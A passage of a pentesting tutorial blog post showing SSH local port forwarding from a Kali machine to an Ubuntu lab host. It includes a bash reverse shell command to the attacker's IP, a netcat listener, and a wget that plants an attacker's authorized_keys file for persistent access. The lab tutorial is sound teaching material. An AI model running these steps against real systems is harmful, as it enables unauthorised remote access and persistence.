+<p class="ai-optimize-104"><span style="color: #000000;">It can be seen below that the application running internally on the ubuntu machine is directly not accessible from our kali machine.</span></p>
+<p class="ai-optimize-105"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEito8J1GNMudLAltaP1NG-YOLNWmNm-fxJJ87xtvXO_h0ze2bj6js4HP1EYcc1AJIkmvzRupXrHKkDTXiO9rMvvZsOpRF0By36OQzQbGtabdxAmfuJMIKG8bekLo5PZ7fxeyi6sKmotrHjIWUAmP6WWYDIsOhQ3CZV22-_3YgZbZ6uRs3Pgj3B5W1Zpqh8d/s16000/51.png"/></span></p>
+<p class="ai-optimize-106"><span style="color: #000000;">Furthermore, from the initial shell access, it is evident that the web application is running internally on port 8080.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netstat -ntlp</pre>
+<p class="ai-optimize-107"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyVOHg_e2pX8Rplbm4Tu79P9FGdjgZKiWw-EG23WaWT74wIDiXk70M4g7mLEZjqqX7oz2wULb50vqtYsqRZ37-6WnT1hIIz4hASD3zMdfOs74MWWcLAxVDL_KNacOtCIiCmAOpKhPq2lji_zUr301FVFMfiz1JOmubGXWDvJ3YxRXqoJPopvofZvjSTyHR/s16000/52.png"/></span></p>
+<p class="ai-optimize-108"><span style="color: #000000;">SSH supports the local port forwarding functionality and hence the web application can be accessed in the kali machine using the local port forwarding command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -L 8080:127.0.0.1:8080 pentest@192.168.31.205</pre>
+<p class="ai-optimize-109"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnN0DL3XaPAjRGCUIBUh1hdjAKEEQORvmxV91aQBREO-9OZX8eP1u12dLFO1ahmE1eImxIvZXTasy8kgur_xMXq2Kr2O5XFaBRGXvYhUCWQpOABkCkXM4nDVMIStELYgkqCUrl2V9MuM576pjY-pfpi9vIaDcFNWpbWhUkwTNuuPrDbPu3LRaUMGf3wPXN/s16000/53.png"/></span></p>
+<h3 class="ai-optimize-110"><span style="color: #800000;">Local Port Forwarding (Key Based Authentication)</span></h3>
+<p class="ai-optimize-111"><span style="color: #000000;">In this scenario, we are going to demonstrate a case where the initial access is gained through a reverse shell. Moreover, there is key-based authentication enabled on the remote server. Therefore, we will add the public key of the Kali user to the authorized_keys file inside the Ubuntu machine and subsequently perform local port forwarding using SSH key based authentication.</span></p>
+<p class="ai-optimize-112"><span style="color: #000000;">Finally, using the reverse shell generator, we will execute the command to receive the reverse shell from the Ubuntu machine.</span></p>
+<p class="ai-optimize-113"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbDnx2EBG3NhL535j5hvG-JgfniMRiOIjLlA_aft6FOvWU7SnKn2Dofs5jkqJREwpVsav7aW0ycXPRFsAzOZqaPFR-Q9jVZr1MIY9Ea6JVqt7aLkL6-riz1kAhQ65RhhkmjDGLX8rsHZgZ2hJ6crttVzhLkBLoQXNXZr9QT1yZ-vJ5TFW6uhO4uFw3Crqf/s16000/60.png"/></span></p>
+<p class="ai-optimize-114"><span style="color: #000000;">The command copied from above is used in the ubuntu machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash -I &gt;&amp; /dev/tcp/192.168.31.141/443 0&gt;&amp;1</pre>
+<p class="ai-optimize-115"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkfCQySQjKcBIED1dWcB5d9Nj4JKC6h9Hjvvlu8BGGJlc8gx4rq2mRMIa3DrJZTO55jIQFm1Rw4HTWZ7RysU7arhyZ1p9apWvz6FGnAj5NQ81mseDVpllvE4ymXonMOKuhEjmoXhl2wW5Et1gvPm7uGeNrGny9oFdeG0Ajv7AeDziUHBt-fkUTJq4P2JYa/s16000/61.png"/></span></p>
+<p class="ai-optimize-116"><span style="color: #000000;">A reverse shell is gained at port 443. Upon enumerating the running services, it can be seen that a web application is running internally on port 8080.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rlwrap nc -lvnp 443
+netstat -tlnp</pre>
+<p class="ai-optimize-117"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwyEqQHjScUrZcMg9AQXb8v2F8TXOnRanXjoD7ZZlVAJMjh_huzpB6nucdD5isU32VSrfLKwLO9bUn7dnUjhVELj0yf4S8-DeAyNDjFSTUi7JkFttYA08Ckqe-jhMddclCfnlCgJkuMYKuK0xc-6PBS8ZK1BSRpOAdybJll8j6Mp7bFHDXpz2dt0d1z7Jv/s16000/62.png"/></span></p>
+<p class="ai-optimize-118"><span style="color: #000000;">Here we are generating the ssh key locally in the kali machine, since we already have an initial access so it will be better if we copy the public key of the root user of kali to the <strong>authorized_keys</strong> file in the ubuntu system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen
+cd .ssh
+ls -al
+cat id_ed25519.pub &gt; authorized_keys
+updog -p 80</pre>
+<p class="ai-optimize-119"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjX5hzn-I4k7lO07MM2hOzqLd9y-tzeywTJ3QbhRhTw1idFxbHzqVgUrUydpdaT-bjPu82T6cwNKQAZAvkK8jtd6-ALgvmwDuiyGR9A4y71qwi7RSvpV9xcFZoBNmq5Y3426iFb0LN0xQ0GO4ub8YEPsw4xLuLnbfS7VhqTh9nzYjO0o2xUd2xRcwj2l2yX/s16000/63.png"/></span></p>
+<p class="ai-optimize-120"><span style="color: #000000;">Inside the initial shell which was gained earlier, we will replace the <strong>authorized_keys</strong> file inside the <strong>.ssh</strong> directory of the <strong>pentest</strong> user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd .ssh
+wget http://192.168.31.141/authorized_keys
+ls -al</pre>
+<p class="ai-optimize-121"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQl0OYdPvDI83_n7UvSL31v-mLnhZCEF_skDg6bntsm3-BYSpWrNITDL4ePKw1UbFrdOtm1IaQFvDVWGXzmNB7p-mPbm_drMvKAz6t6B4HMQ-PCQctKS90k7A2-RgMc3eFur1hxbQzHkJKrEniK0fUJwwcPe0DrnorC5DFI5-25-dCRvPG9NWICQ39oXsp/s16000/65.png"/></span></p>
+<p class="ai-optimize-122"><span style="color: #000000;">Then, once the <strong>authorized_keys</strong> file is copied now we can use the private key of root user inside kali machine to perform local port forward and access the web application running at port 8080. Here we are forwarding the application port to 7777 in the kali machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_ed25519 -L 7777:127.0.0.1:8080 pentest@192.168.31.205</pre>
+<p class="ai-optimize-123"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiLxtCz6ZlpqSQQ__H9q3GGHGCMZfhwefiw8qDR08xRJRmWz9nU9FoRK5YLJuvOixCTBZ-tBpzmAjcJ5MAOht_neF5gIw_YVze8vsScg9UUijytVNfPaBJsdTYDsABJX7jMjBFAQ9bJMPkkIPp7y4Y9aWlYgH-7uNrca5JV2_QLndALBc8w163fJ85HYxX/s16000/68.png"/></span></p>
+<h3 class="ai-optimize-124"><span style="color: #800000;">Conclusion</span></h3>
+<p class="ai-optimize-125"><span style="color: #000000;">SSH is a vital utility for system administrators and security experts. Mastering different connection techniques and following best practices ensures the secure and efficient administration of remote systems. By employing Kali Linux to access an Ubuntu machine. We’ve demonstrated the flexibility and strength of the SSH protocol, emphasizing its significant role in contemporary network security.</span></p>
+<p class="ai-optimize-126"><span style="color: #000000;"><strong>Author: </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultant. Contact</span> <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
